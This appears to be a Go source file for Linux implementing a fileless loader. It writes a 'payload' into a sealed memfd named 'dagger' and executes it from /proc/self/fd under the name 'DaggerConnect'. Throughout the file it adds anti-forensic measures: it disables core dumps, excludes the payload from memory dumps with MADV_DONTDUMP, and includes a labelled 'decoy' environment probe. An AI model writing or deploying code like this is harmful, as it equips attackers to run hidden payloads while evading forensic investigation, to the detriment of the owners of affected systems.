//go:build linux

package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

const (
	// Syscall numbers (Linux x86_64)
	SYS_MEMFD_CREATE = 319

	// memfd_create flags
	MFD_CLOEXEC       = 0x0001
	MFD_ALLOW_SEALING = 0x0002

	// fcntl sealing commands and flags
	F_LINUX_SPECIFIC_BASE = 1024
	F_ADD_SEALS           = F_LINUX_SPECIFIC_BASE + 9
	F_GET_SEALS           = F_LINUX_SPECIFIC_BASE + 10

	F_SEAL_SEAL   = 0x0001
	F_SEAL_SHRINK = 0x0002
	F_SEAL_GROW   = 0x0004
	F_SEAL_WRITE  = 0x0008

	MADV_DONTDUMP   = 16
	PR_SET_DUMPABLE = 4
)

// CheckEnvironment performs environmental validation and disables core dumpability
func CheckEnvironment() {
	// Disable core dumpability (prctl PR_SET_DUMPABLE, 0)
	_, _, _ = syscall.RawSyscall(syscall.SYS_PRCTL, uintptr(PR_SET_DUMPABLE), 0, 0)

	// Decoy environment probe: check /usr/bin/timedatectl
	if fi, err := os.Stat("/usr/bin/timedatectl"); err == nil {
		_ = fi.Mode().Perm()
	}
}

// ProtectMemory marks the payload buffer with MADV_DONTDUMP so memory dumps do not capture it
func ProtectMemory(b []byte) {
	if len(b) == 0 {
		return
	}
	pageSize := os.Getpagesize()
	ptr := uintptr(unsafe.Pointer(&b[0]))
	alignedPtr := ptr &^ uintptr(pageSize - 1)
	endPtr := (ptr + uintptr(len(b)) + uintptr(pageSize-1)) &^ uintptr(pageSize - 1)
	alignedLen := endPtr - alignedPtr

	_, _, _ = syscall.Syscall(syscall.SYS_MADVISE, alignedPtr, alignedLen, uintptr(MADV_DONTDUMP))
}

// CreateMemFD allocates an anonymous in-memory file descriptor named "dagger"
func CreateMemFD(name string) (uintptr, error) {
	nameBytes, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0, err
	}

	fd, _, errno := syscall.Syscall(
		SYS_MEMFD_CREATE,
		uintptr(unsafe.Pointer(nameBytes)),
		uintptr(MFD_CLOEXEC|MFD_ALLOW_SEALING),
		0,
	)
	if int(fd) < 0 || errno != 0 {
		return 0, fmt.Errorf("memfd_create failed: %w", errno)
	}
	return fd, nil
}

// SealMemFD applies immutable seals (F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)
func SealMemFD(fd uintptr) error {
	seals := uintptr(F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)
	_, _, errno := syscall.Syscall(syscall.SYS_FCNTL, fd, uintptr(F_ADD_SEALS), seals)
	if errno != 0 {
		return fmt.Errorf("fcntl F_ADD_SEALS failed: %w", errno)
	}
	return nil
}

// ExecuteInMemory runs the executable directly from RAM using memfd and /proc/self/fd
func ExecuteInMemory(payload []byte, args []string) (int, error) {
	CheckEnvironment()
	ProtectMemory(payload)

	fd, err := CreateMemFD("dagger")
	if err != nil {
		return 1, err
	}

	memFile := os.NewFile(fd, "dagger")
	if _, err := memFile.Write(payload); err != nil {
		memFile.Close()
		return 1, fmt.Errorf("failed to write payload to memfd: %w", err)
	}

	if err := SealMemFD(fd); err != nil {
		memFile.Close()
		return 1, fmt.Errorf("failed to seal memfd: %w", err)
	}

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	cmd := exec.Command(fdPath, args...)
	cmd.Args[0] = "DaggerConnect"
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Run()
	memFile.Close()

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			return exitErr.ExitCode(), nil
		}
		return 1, err
	}
	return 0, nil
}
